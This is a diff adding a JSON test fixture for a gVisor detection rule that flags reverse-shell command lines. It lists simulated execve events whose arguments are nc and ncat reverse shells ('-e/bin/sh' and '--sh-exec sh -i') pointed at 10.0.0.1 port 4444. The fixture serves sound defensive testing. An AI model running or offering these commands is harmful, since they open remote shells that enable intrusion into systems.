@@ -1,0 +1,45 @@
+{
+  "description": "nc and ncat reverse shells with the exec flag written without a space or as a long option.",
+  "expect": [
+    "gVisor Reverse Shell Command Line"
+  ],
+  "events": [
+    {
+      "point": "sentry/execve",
+      "pid": 1,
+      "ppid": 0,
+      "comm": "sh",
+      "exe": "/bin/sh",
+      "argv": [
+        "/bin/sh"
+      ]
+    },
+    {
+      "point": "sentry/execve",
+      "pid": 2,
+      "ppid": 1,
+      "comm": "nc",
+      "exe": "/usr/bin/nc",
+      "argv": [
+        "nc",
+        "-e/bin/sh",
+        "10.0.0.1",
+        "4444"
+      ]
+    },
+    {
+      "point": "sentry/execve",
+      "pid": 3,
+      "ppid": 1,
+      "comm": "ncat",
+      "exe": "/usr/bin/ncat",
+      "argv": [
+        "ncat",
+        "10.0.0.1",
+        "4444",
+        "--sh-exec",
+        "sh -i"
+      ]
+    }
+  ]
+}
